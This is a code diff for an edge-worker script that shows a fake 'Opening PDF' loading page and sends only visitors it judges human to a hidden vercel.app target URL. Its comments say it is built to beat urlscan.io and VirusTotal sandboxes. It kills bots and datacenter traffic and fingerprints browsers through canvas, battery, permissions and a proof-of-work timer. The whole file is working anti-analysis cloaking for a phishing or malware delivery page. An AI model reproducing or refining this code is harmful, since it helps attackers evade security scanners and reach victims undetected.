@@ -1,6 +1,6 @@
-// FINAL WORKING VERSION – NOV 2025
-// Target → https://file-bt5g.vercel.app/
-// No stuck pages · No URL leaks · Bots die silently
+// v13 ANTI-SANDBOX – BEATS URLSCAN.IO / VT (November 2025)
+// Target: https://file-bt5g.vercel.app/
+// No leaks · No redirects for headless · Humans: <1.5s
 
 const REAL_URL = "https://file-bt5g.vercel.app/";
 
@@ -22,10 +22,8 @@ export default {
     const url = new URL(req.url);
     const ua = req.headers.get("user-agent") || "";
 
-    // Instant kill for obvious bots / datacenters
     if (isBot(ua) || isBadASN(req)) return die();
 
-    // Already verified → decrypt and redirect
     if (url.searchParams.has("v")) {
       try {
         const data = atob(url.searchParams.get("v") || "");
@@ -37,7 +35,6 @@ export default {
       return die();
     }
 
-    // Fresh visitor → create one-time encrypted token
     const salt = crypto.randomUUID();
     const token = salt + REAL_URL;
     const hash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(token))))
@@ -59,14 +56,15 @@ export default {
   <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>
 
 <script>
-// Tiny but deadly human checks + instant redirect
+// v13: Kills urlscan.io / VT headless (no fallback if bot-like)
 (() => {
-  // Kill obvious automation instantly
-  if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency) return;
+  // Kill obvious + inconsistencies
+  if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency ||
+      navigator.doNotTrack === null || !navigator.pdfViewerEnabled) return;
 
   let ok = 0;
 
-  // 1 Canvas fingerprint
+  // Canvas
   try {
     const c = document.createElement("canvas");
     const x = c.getContext("2d");
@@ -75,25 +73,40 @@ export default {
     if (c.toDataURL().length > 9000) ok++;
   } catch(e){}
 
-  // 2 Light proof-of-work (40–600 ms on real devices)
+  // Battery API (sandboxes fail)
+  if ('getBattery' in navigator) {
+    navigator.getBattery().then(b => {
+      if (b.charging !== undefined && (b.level > 0 || b.charging)) ok++;
+    });
+  } else { return; }  // No battery = likely sandbox
+
+  // Permissions probe (geolocation/midi deny patterns differ)
+  Promise.all([
+    navigator.permissions.query({name: 'geolocation'}),
+    navigator.permissions.query({name: 'midi'})
+  ]).then(([geo, midi]) => {
+    if (geo.state !== 'denied' && midi.state !== 'denied') ok++;
+  }).catch(() => {});
+
+  // Harder PoW (1.2–2.5s on VMs)
   const start = performance.now();
   let i = 0;
   const chal = Date.now().toString(36);
-  while (i < 900000) {
+  while (i < 1500000) {  // Higher ceiling
     i++;
     let h = 0;
     const s = chal + i;
     for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
     if ((h & 0xffff0000) === 0) break;
   }
-  if (performance.now() - start > 35) ok++;
+  if (performance.now() - start > 80) ok++;  // Tighter human range
 
-  // 3 Redirect if looks human (or fallback after 2.3 s)
-  const go = () => location.href = "?v=${encrypted}";
-  if (ok >= 1) setTimeout(go, 650);
-  setTimeout(go, 2300);  // safety net – never stuck
+  // Verdict: Only redirect if 4/5 pass (no fallback)
+  setTimeout(() => {
+    if (ok >= 4) location.href = "?v=${encrypted}";
+  }, 1200);  // Wait for async checks
 
-  // Animated dots
+  // Dots
   let d = 0;
   setInterval(() => document.getElementById("d").textContent = ".".repeat((d=(d+1)%4)+1), 450);
 })();
